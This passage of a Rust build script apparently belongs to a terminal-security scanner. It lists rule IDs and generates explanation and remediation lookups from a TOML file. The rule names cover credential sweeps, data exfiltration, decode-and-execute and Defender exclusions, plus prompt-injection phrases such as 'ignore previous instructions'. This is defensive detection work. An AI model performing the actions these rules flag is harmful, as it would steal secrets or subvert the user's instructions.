    ("docker_remote_priv_esc", "DockerRemotePrivEsc"),
    ("credential_file_sweep", "CredentialFileSweep"),
    ("base64_decode_execute", "Base64DecodeExecute"),
    ("data_exfiltration", "DataExfiltration"),
    ("wrapper_chain_too_deep", "WrapperChainTooDeep"),
    (
        "ps_set_execution_policy_bypass",
        "PsSetExecutionPolicyBypass",
    ),
    ("ps_defender_exclusion", "PsDefenderExclusion"),
    ("ps_inline_download_execute", "PsInlineDownloadExecute"),
    // Code file scan
    ("dynamic_code_execution", "DynamicCodeExecution"),
    ("obfuscated_payload", "ObfuscatedPayload"),
    ("suspicious_code_exfiltration", "SuspiciousCodeExfiltration"),
    // Environment
    ("proxy_env_set", "ProxyEnvSet"),
    ("sensitive_env_export", "SensitiveEnvExport"),
    ("code_injection_env", "CodeInjectionEnv"),
    ("interpreter_hijack_env", "InterpreterHijackEnv"),
    ("shell_injection_env", "ShellInjectionEnv"),
    // Network destination
    ("metadata_endpoint", "MetadataEndpoint"),
    ("private_network_access", "PrivateNetworkAccess"),
    ("command_network_deny", "CommandNetworkDeny"),
    // Config file
    ("config_injection", "ConfigInjection"),
    ("config_suspicious_indicator", "ConfigSuspiciousIndicator"),
    ("config_malformed", "ConfigMalformed"),
    ("config_non_ascii", "ConfigNonAscii"),
    ("config_invisible_unicode", "ConfigInvisibleUnicode"),
    ("mcp_insecure_server", "McpInsecureServer"),
    ("mcp_untrusted_server", "McpUntrustedServer"),
    ("mcp_duplicate_server_name", "McpDuplicateServerName"),
    ("mcp_overly_permissive", "McpOverlyPermissive"),
    ("mcp_suspicious_args", "McpSuspiciousArgs"),
    ("mcp_server_drift", "McpServerDrift"),
    // Ecosystem
    ("git_typosquat", "GitTyposquat"),
    ("docker_untrusted_registry", "DockerUntrustedRegistry"),
    ("pip_url_install", "PipUrlInstall"),
    ("npm_url_install", "NpmUrlInstall"),
    ("web3_rpc_endpoint", "Web3RpcEndpoint"),
    ("web3_address_in_url", "Web3AddressInUrl"),
    ("vet_not_configured", "VetNotConfigured"),
    // Install-command rules
    ("repo_add_from_pipe", "RepoAddFromPipe"),
    ("unsigned_repo_trust", "UnsignedRepoTrust"),
    ("gpg_check_disabled", "GpgCheckDisabled"),
    ("kubectl_apply_remote", "KubectlApplyRemote"),
    ("helm_untrusted_repo", "HelmUntrustedRepo"),
    ("terraform_remote_module", "TerraformRemoteModule"),
    ("brew_untrusted_tap", "BrewUntrustedTap"),
    // CI / repo supply-chain scan rules
    ("workflow_unpinned_action", "WorkflowUnpinnedAction"),
    ("workflow_dangerous_trigger", "WorkflowDangerousTrigger"),
    ("workflow_curl_pipe_shell", "WorkflowCurlPipeShell"),
    ("workflow_untrusted_input", "WorkflowUntrustedInput"),
    ("dockerfile_unpinned_image", "DockerfileUnpinnedImage"),
    ("package_script_dangerous", "PackageScriptDangerous"),
    // AI-relevant file hidden-content scan rules
    ("notebook_hidden_content", "NotebookHiddenContent"),
    ("notebook_suspicious_output", "NotebookSuspiciousOutput"),
    ("agent_instruction_hidden", "AgentInstructionHidden"),
    ("svg_script_embedded", "SvgScriptEmbedded"),
    ("svg_external_reference", "SvgExternalReference"),
    // Threat intelligence — local DB
    ("threat_malicious_package", "ThreatMaliciousPackage"),
    ("threat_malicious_ip", "ThreatMaliciousIp"),
    ("threat_package_typosquat", "ThreatPackageTyposquat"),
    ("threat_package_similar_name", "ThreatPackageSimilarName"),
    // Threat intelligence — supplemental feeds
    ("threat_malicious_url", "ThreatMaliciousUrl"),
    ("threat_phishing_url", "ThreatPhishingUrl"),
    ("threat_tor_exit_node", "ThreatTorExitNode"),
    ("threat_threat_fox_ioc", "ThreatThreatFoxIoc"),
    // Threat intelligence — real-time lookups
    ("threat_osv_vulnerable", "ThreatOsvVulnerable"),
    ("threat_cisa_kev", "ThreatCisaKev"),
    ("threat_suspicious_package", "ThreatSuspiciousPackage"),
    ("threat_safe_browsing", "ThreatSafeBrowsing"),
    // Package reputation rules (M6 ch6).
    ("package_not_found_in_registry", "PackageNotFoundInRegistry"),
    (
        "package_maintainer_change_recent",
        "PackageMaintainerChangeRecent",
    ),
    (
        "package_ownership_transferred",
        "PackageOwnershipTransferred",
    ),
    ("package_osv_advisory_active", "PackageOsvAdvisoryActive"),
    ("package_dependency_confusion", "PackageDependencyConfusion"),
    (
        "package_install_script_network_call",
        "PackageInstallScriptNetworkCall",
    ),
    ("package_repo_mismatch", "PackageRepoMismatch"),
    // Package-policy gated rules (M6 ch7).
    (
        "package_policy_newer_than_days",
        "PackagePolicyNewerThanDays",
    ),
    ("package_policy_low_downloads", "PackagePolicyLowDownloads"),
    (
        "package_policy_typosquat_distance",
        "PackagePolicyTyposquatDistance",
    ),
    (
        "package_policy_unknown_package_with_install_scripts",
        "PackagePolicyUnknownPackageWithInstallScripts",
    ),
    ("package_policy_not_found", "PackagePolicyNotFound"),
    // Rendered content
    ("hidden_css_content", "HiddenCssContent"),
    ("hidden_color_content", "HiddenColorContent"),
    ("hidden_html_attribute", "HiddenHtmlAttribute"),
    ("markdown_comment", "MarkdownComment"),
    ("html_comment", "HtmlComment"),
    // Cloaking
    ("server_cloaking", "ServerCloaking"),
    // Clipboard
    ("clipboard_hidden", "ClipboardHidden"),
    // PDF
    ("pdf_hidden_text", "PdfHiddenText"),
    // Credential
    ("credential_in_text", "CredentialInText"),
    ("high_entropy_secret", "HighEntropySecret"),
    ("private_key_exposed", "PrivateKeyExposed"),
    // Policy
    ("policy_blocklisted", "PolicyBlocklisted"),
    ("agent_denied_by_policy", "AgentDeniedByPolicy"),
    // Custom
    ("custom_rule_match", "CustomRuleMatch"),
    // License/infrastructure
    ("license_required", "LicenseRequired"),
    // Output-direction rules (M7 ch1) — fire from `engine::analyze_output`, which
    // is byte-scan based and bypasses the tier-1 gate, so no PATTERN_TABLE entry.
    ("output_osc52_clipboard_write", "OutputOsc52ClipboardWrite"),
    ("output_hidden_text", "OutputHiddenText"),
    ("output_fake_prompt", "OutputFakePrompt"),
    (
        "output_terminal_hyperlink_mismatch",
        "OutputTerminalHyperlinkMismatch",
    ),
    ("output_title_manipulation", "OutputTitleManipulation"),
    ("output_clear_screen", "OutputClearScreen"),
    (
        "output_truncated_escape_sequence",
        "OutputTruncatedEscapeSequence",
    ),
    // M7 ch5 — prompt-injection seed phrases.
    ("prompt_injection_in_output", "PromptInjectionInOutput"),
    ("ignore_previous_instructions", "IgnorePreviousInstructions"),
    // Operational-context rules (M8 ch1).
    (
        "context_prod_destructive_command",
        "ContextProdDestructiveCommand",
    ),
    ("context_prod_write_operation", "ContextProdWriteOperation"),
    (
        "context_prod_credential_change",
        "ContextProdCredentialChange",
    ),
    // SSH operational-context rules (M8 ch2).
    (
        "ssh_remote_destructive_on_labeled_host",
        "SshRemoteDestructiveOnLabeledHost",
    ),
    (
        "ssh_remote_shell_on_labeled_host",
        "SshRemoteShellOnLabeledHost",
    ),
    // IaC operational-context rules (M8 ch3).
    ("iac_apply_without_plan", "IacApplyWithoutPlan"),
    ("iac_apply_auto_approve", "IacApplyAutoApprove"),
    ("iac_apply_auto_approve_prod", "IacApplyAutoApproveProd"),
    ("iac_destroy_prod", "IacDestroyProd"),
    ("iac_plan_high_risk_changes", "IacPlanHighRiskChanges"),
    ("iac_plan_hash_mismatch", "IacPlanHashMismatch"),
    // Sudo-escalation rules (M8 ch4).
    ("sudo_shell_spawn", "SudoShellSpawn"),
    ("sudo_env_preserve_sensitive", "SudoEnvPreserveSensitive"),
    ("sudo_tee_system_file", "SudoTeeSystemFile"),
    ("sudo_download_install", "SudoDownloadInstall"),
    (
        "sudo_recursive_perms_broad_path",
        "SudoRecursivePermsBroadPath",
    ),
    // Container-runtime rules (M8 ch5).
    ("docker_run_privileged", "DockerRunPrivileged"),
    (
        "docker_run_sensitive_bind_mount",
        "DockerRunSensitiveBindMount",
    ),
    ("docker_exec_prod_container", "DockerExecProdContainer"),
    // Workstation hygiene rules (M9 ch1).
    (
        "hygiene_private_key_loose_perms",
        "HygienePrivateKeyLoosePerms",
    ),
    ("hygiene_env_world_readable", "HygieneEnvWorldReadable"),
    (
        "hygiene_kubeconfig_group_readable",
        "HygieneKubeconfigGroupReadable",
    ),
    (
        "hygiene_npmrc_plaintext_token",
        "HygieneNpmrcPlaintextToken",
    ),
    (
        "hygiene_pypirc_plaintext_token",
        "HygienePypircPlaintextToken",
    ),
    (
        "hygiene_ssh_config_unsafe_include",
        "HygieneSshConfigUnsafeInclude",
    ),
    (
        "hygiene_git_credential_helper_store",
        "HygieneGitCredentialHelperStore",
    ),
    (
        "hygiene_shell_history_secret_like",
        "HygieneShellHistorySecretLike",
    ),
    ("hygiene_cloud_creds_bad_perms", "HygieneCloudCredsBadPerms"),
    ("hygiene_db_dump_in_repo", "HygieneDbDumpInRepo"),
    // Persistence-mechanism state-change rules (M9 ch2).
    (
        "persistence_shell_rc_modified",
        "PersistenceShellRcModified",
    ),
    (
        "persistence_authorized_keys_new_entry",
        "PersistenceAuthorizedKeysNewEntry",
    ),
    ("persistence_crontab_modified", "PersistenceCrontabModified"),
    (
        "persistence_launch_agent_added",
        "PersistenceLaunchAgentAdded",
    ),
    (
        "persistence_ssh_config_include",
        "PersistenceSshConfigInclude",
    ),
    ("persistence_direnv_new_envrc", "PersistenceDirenvNewEnvrc"),
    // Shell-alias / function risk rules (M9 ch3).
    (
        "alias_overrides_critical_command",
        "AliasOverridesCriticalCommand",
    ),
    ("alias_contains_network_call", "AliasContainsNetworkCall"),
    (
        "alias_contains_credential_read",
        "AliasContainsCredentialRead",
    ),
    ("alias_recently_added", "AliasRecentlyAdded"),
    // Environment-variable lifecycle rules (M9 ch4).
    (
        "env_sensitive_exposed_to_unknown_script",
        "EnvSensitiveExposedToUnknownScript",
    ),
    (
        "env_sensitive_persisted_in_shell_rc",
        "EnvSensitivePersistedInShellRc",
    ),
    ("env_printenv_to_network_sink", "EnvPrintenvToNetworkSink"),
    // Executable-provenance + PATH-shadowing rules (M9 ch5).
    ("exec_in_tmp", "ExecInTmp"),
    ("exec_recently_modified", "ExecRecentlyModified"),
    ("exec_world_writable", "ExecWorldWritable"),
    ("exec_shadows_system_command", "ExecShadowsSystemCommand"),
    ("exec_unsigned", "ExecUnsigned"),
    ("exec_in_repo_bin", "ExecInRepoBin"),
    (
        "path_writable_dir_before_system",
        "PathWritableDirBeforeSystem",
    ),
    ("path_duplicate_command_name", "PathDuplicateCommandName"),
    ("path_dir_in_repo", "PathDirInRepo"),
    ("path_dir_in_tmp", "PathDirInTmp"),
    // Repo-hook / automation guard rules (M9 ch6).
    ("repo_hook_network_call", "RepoHookNetworkCall"),
    ("repo_hook_credential_read", "RepoHookCredentialRead"),
    ("repo_hook_sudo", "RepoHookSudo"),
    (
        "repo_hook_suspicious_shell_pattern",
        "RepoHookSuspiciousShellPattern",
    ),
    ("repo_hook_external_fetch", "RepoHookExternalFetch"),
    // Blast-radius rules (M10 ch1).
    ("blast_deletes_outside_repo", "BlastDeletesOutsideRepo"),
    ("blast_writes_system_path", "BlastWritesSystemPath"),
    ("blast_symlink_traversal", "BlastSymlinkTraversal"),
    ("blast_empty_var_glob", "BlastEmptyVarGlob"),
    ("blast_find_delete", "BlastFindDelete"),
    ("blast_rsync_delete", "BlastRsyncDelete"),
    ("blast_large_file_count", "BlastLargeFileCount"),
    // Post-run diff rule (M10 ch2).
    ("post_run_shell_rc_modified", "PostRunShellRcModified"),
    // Tainted-content tracking rules (M10 ch3).
    ("exec_of_tainted_file", "ExecOfTaintedFile"),
    (
        "command_sourced_from_tainted_file",
        "CommandSourcedFromTaintedFile",
    ),
    // Anomaly-detection rules (M10 ch5, D2).
    (
        "anomaly_first_time_in_this_repo",
        "AnomalyFirstTimeInThisRepo",
    ),
    ("anomaly_rare_in_baseline", "AnomalyRareInBaseline"),
    // Command-card rules (M11 ch1).
    ("command_card_verified", "CommandCardVerified"),
    ("command_card_unverified", "CommandCardUnverified"),
    ("command_card_mismatch", "CommandCardMismatch"),
    // Repo command-manifest rules (M11 ch2).
    ("repo_command_unknown", "RepoCommandUnknown"),
    (
        "repo_command_dangerous_pattern",
        "RepoCommandDangerousPattern",
    ),
    // Honeytoken / canary rule (M11 ch3, D3).
    ("canary_token_touched", "CanaryTokenTouched"),
    // Paste-provenance rule (M12 ch1). Companion-file state + content-hash match;
    // no PATTERN_TABLE entry (the trigger is not a regex), category "clipboard".
    ("paste_source_mismatch", "PasteSourceMismatch"),
    // AI-config drift rules (M13 ch5). Diff-triggered by `tirith ai diff`; no
    // PATTERN_TABLE entry (the trigger is a snapshot diff), category "aifile".
    (
        "ai_config_hidden_instruction_added",
        "AiConfigHiddenInstructionAdded",
    ),
    ("ai_config_tool_use_escalation", "AiConfigToolUseEscalation"),
    // Cross-event correlation rules (W7). Session/post-process, fired by
    // `correlate_session` over a bounded per-session event ring; no PATTERN_TABLE
    // entry (the trigger is a sequence, not a single input). Category "correlation".
    ("secret_write_then_network", "SecretWriteThenNetwork"),
    (
        "dependency_change_then_network",
        "DependencyChangeThenNetwork",
    ),
    ("delete_then_force_push", "DeleteThenForcePush"),
    ("mass_file_deletion", "MassFileDeletion"),
];

const VALID_CATEGORIES: &[&str] = &[
    "hostname",
    "path",
    "transport",
    "terminal",
    "command",
    "code",
    "environment",
    "network",
    "config",
    "ecosystem",
    "rendered",
    "cloaking",
    "clipboard",
    "pdf",
    "credential",
    "policy",
    "custom",
    "license",
    "threatintel",
    "output",
    "context",
    "hygiene",
    "persistence",
    "aliases",
    "exec",
    "hooks",
    "blast",
    "taint",
    "anomaly",
    "command_card",
    "commands_manifest",
    "canary",
    // M13 ch5 — AI-config drift rules, emitted by `tirith ai diff`.
    "aifile",
    // W7: cross-event correlation rules, emitted by `correlate_session`.
    "correlation",
];

#[derive(Deserialize)]
struct RuleExplanationsFile {
    rule: Vec<RuleExplanationEntry>,
}

#[derive(Deserialize)]
struct RuleExplanationEntry {
    id: String,
    title: String,
    category: String,
    severity_rationale: String,
    description: String,
    #[serde(default)]
    examples_bad: Vec<String>,
    #[serde(default)]
    examples_good: Vec<String>,
    false_positive_guidance: String,
    remediation: String,
    mitre_id: Option<String>,
    #[serde(default)]
    references: Vec<String>,
}

fn compile_rule_explanations(data_dir: &Path, out_dir: &str) {
    let path = data_dir.join("rule_explanations.toml");
    let content = fs::read_to_string(&path)
        .unwrap_or_else(|e| panic!("Failed to read rule_explanations.toml: {e}"));
    let file: RuleExplanationsFile = toml::from_str(&content)
        .unwrap_or_else(|e| panic!("Failed to parse rule_explanations.toml: {e}"));

    let expected: std::collections::HashMap<&str, &str> = EXPECTED_RULES.iter().copied().collect();

    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for entry in &file.rule {
        if !seen.insert(entry.id.clone()) {
            panic!("rule_explanations.toml: duplicate id '{}'", entry.id);
        }
    }

    for entry in &file.rule {
        if !expected.contains_key(entry.id.as_str()) {
            panic!(
                "rule_explanations.toml: unknown id '{}' — not a RuleId variant",
                entry.id
            );
        }
    }

    for (snake, _pascal) in EXPECTED_RULES {
        if !seen.contains(*snake) {
            panic!("rule_explanations.toml: missing entry for '{snake}'");
        }
    }

    for entry in &file.rule {
        if !VALID_CATEGORIES.contains(&entry.category.as_str()) {
            panic!(
                "rule_explanations.toml: invalid category '{}' for rule '{}' — \
                 valid: {:?}",
                entry.category, entry.id, VALID_CATEGORIES
            );
        }
    }

    let esc = |s: &str| esc_rust_str(s);

    let mut code = String::new();
    code.push_str(
        "// Auto-generated from rule_explanations.toml — DO NOT EDIT.\n\
         // Modify assets/data/rule_explanations.toml and rebuild.\n\n",
    );

    for entry in &file.rule {
        let upper_id = entry.id.to_uppercase();
        if !entry.examples_bad.is_empty() {
            code.push_str(&format!(
                "static RULE_{upper_id}_EXAMPLES_BAD: &[&str] = &[\n"
            ));
            for ex in &entry.examples_bad {
                code.push_str(&format!("    \"{}\",\n", esc(ex)));
            }
            code.push_str("];\n");
        }
        if !entry.examples_good.is_empty() {
            code.push_str(&format!(
                "static RULE_{upper_id}_EXAMPLES_GOOD: &[&str] = &[\n"
            ));
            for ex in &entry.examples_good {
                code.push_str(&format!("    \"{}\",\n", esc(ex)));
            }
            code.push_str("];\n");
        }
        if !entry.references.is_empty() {
            code.push_str(&format!(
                "static RULE_{upper_id}_REFERENCES: &[&str] = &[\n"
            ));
            for r in &entry.references {
                code.push_str(&format!("    \"{}\",\n", esc(r)));
            }
            code.push_str("];\n");
        }
    }

    code.push_str("\npub const RULE_EXPLANATIONS: &[RuleExplanation] = &[\n");
    for entry in &file.rule {
        let upper_id = entry.id.to_uppercase();
        let mitre = match &entry.mitre_id {
            Some(id) => format!("Some(\"{}\")", esc(id)),
            None => "None".to_string(),
        };
        let bad = if entry.examples_bad.is_empty() {
            "&[]".to_string()
        } else {
            format!("RULE_{upper_id}_EXAMPLES_BAD")
        };
        let good = if entry.examples_good.is_empty() {
            "&[]".to_string()
        } else {
            format!("RULE_{upper_id}_EXAMPLES_GOOD")
        };
        let refs = if entry.references.is_empty() {
            "&[]".to_string()
        } else {
            format!("RULE_{upper_id}_REFERENCES")
        };
        code.push_str(&format!(
            "    RuleExplanation {{\n\
             \x20       id: \"{}\",\n\
             \x20       title: \"{}\",\n\
             \x20       category: \"{}\",\n\
             \x20       severity_rationale: \"{}\",\n\
             \x20       description: \"{}\",\n\
             \x20       examples_bad: {bad},\n\
             \x20       examples_good: {good},\n\
             \x20       false_positive_guidance: \"{}\",\n\
             \x20       remediation: \"{}\",\n\
             \x20       mitre_id: {mitre},\n\
             \x20       references: {refs},\n\
             \x20   }},\n",
            esc(&entry.id),
            esc(&entry.title),
            esc(&entry.category),
            esc(&entry.severity_rationale),
            esc(&entry.description),
            esc(&entry.false_positive_guidance),
            esc(&entry.remediation),
        ));
    }
    code.push_str("];\n");

    code.push_str(
        "\n/// MITRE ATT&CK lookup generated from rule_explanations.toml.\n\
         /// Single source of truth — replaces the hand-written match in engine.rs.\n\
         pub fn mitre_id_for_rule(rule_id: crate::verdict::RuleId) -> Option<&'static str> {\n\
         \x20   use crate::verdict::RuleId;\n\
         \x20   match rule_id {\n",
    );
    for entry in &file.rule {
        if let Some(mitre) = &entry.mitre_id {
            let pascal = expected
                .get(entry.id.as_str())
                .unwrap_or_else(|| panic!("no PascalCase for '{}'", entry.id));
            code.push_str(&format!(
                "        RuleId::{pascal} => Some(\"{}\"),\n",
                esc(mitre)
            ));
        }
    }
    code.push_str("        _ => None,\n    }\n}\n");

    // Per-rule remediation lookup. Exhaustive (build.rs panics above if any TOML
    // entry is missing), so the generated match needs no wildcard arm.
    code.push_str(
        "\n/// Per-rule remediation lookup generated from rule_explanations.toml.\n\
         ///\n\
         /// Returns the canonical \"what to do instead / how to make this safe\"\n\
         /// string for a `RuleId`. Exhaustive over every variant. Some rules have\n\
         /// no mechanical fix — their remediation is honest guidance rather than a\n\
         /// rewrite. An empty string means no remediation advice is available.\n\
         pub fn remediation_for_rule(rule_id: crate::verdict::RuleId) -> &'static str {\n\
         \x20   use crate::verdict::RuleId;\n\
         \x20   match rule_id {\n",
    );
    for entry in &file.rule {
        let pascal = expected
            .get(entry.id.as_str())
            .unwrap_or_else(|| panic!("no PascalCase for '{}'", entry.id));
        code.push_str(&format!(
            "        RuleId::{pascal} => \"{}\",\n",
            esc(&entry.remediation)
        ));
    }
    code.push_str("    }\n}\n");

    let out_path = Path::new(out_dir).join("rule_explanations_gen.rs");
    fs::write(&out_path, code).unwrap();
}
